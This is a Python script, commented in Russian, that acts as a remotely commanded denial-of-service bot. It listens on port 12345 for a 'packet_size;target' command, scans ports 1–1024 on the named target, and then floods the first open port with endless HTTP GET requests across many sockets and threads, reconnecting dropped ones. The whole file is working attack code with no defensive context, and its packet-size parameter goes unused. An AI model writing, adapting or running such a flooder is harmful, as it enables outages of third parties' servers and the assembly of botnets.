import socket
import threading

def scan_ports(target, start_port, end_port):
    for port in range(start_port, end_port + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"Port {port} is open")
                s.close()
                return port  # Возвращаем первый открытый порт
            s.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    return None

def attack(target, port, packet_size, num_sockets):
    sockets = []
    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            sockets.append(s)
        except Exception as e:
            print(f"Error creating socket: {e}")

    packet_counter = 0
    while True:
        for s in sockets:
            try:
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
                s.send(request.encode('ascii'))
                packet_counter += 1
                print(f"Sent packet {packet_counter} to {target}:{port}")
            except Exception as e:
                print(f"Error sending packet: {e}")
                sockets.remove(s)
                s.close()
                # Переподключение сокета
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    sockets.append(s)
                except Exception as e:
                    print(f"Error reconnecting socket: {e}")

def listen_for_commands(server_ip, server_port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)
    print(f"Listening for commands on {server_ip}:{server_port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Received connection from {client_address}")
        command = client_socket.recv(1024).decode('ascii')
        client_socket.close()

        if command:
            try:
                packet_size, target = command.split(';')
                packet_size = int(packet_size)
                print(f"Received command: packet_size={packet_size}, target={target}")

                # Проверка открытых портов
                first_open_port = scan_ports(target, 1, 1024)
                if not first_open_port:
                    print("No open ports found.")
                    continue

                print(f"Attacking the first open port: {first_open_port}")

                # Запуск атаки в нескольких потоках
                num_sockets = 100  # Количество сокетов
                num_threads = 10  # Количество потоков
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=attack, args=(target, first_open_port, packet_size, num_sockets // num_threads))
                    thread.start()
                    threads.append(thread)

            except Exception as e:
                print(f"Error processing command: {e}")

def main():
    server_ip = '0.0.0.0'  # Слушаем на всех доступных интерфейсах
    server_port = 12345

    # Запуск сервера для ожидания команд
    server_thread = threading.Thread(target=listen_for_commands, args=(server_ip, server_port))
    server_thread.start()

    # Дожидаемся завершения серверного потока (хотя в данном случае он бесконечный)
    server_thread.join()

if __name__ == "__main__":
    main()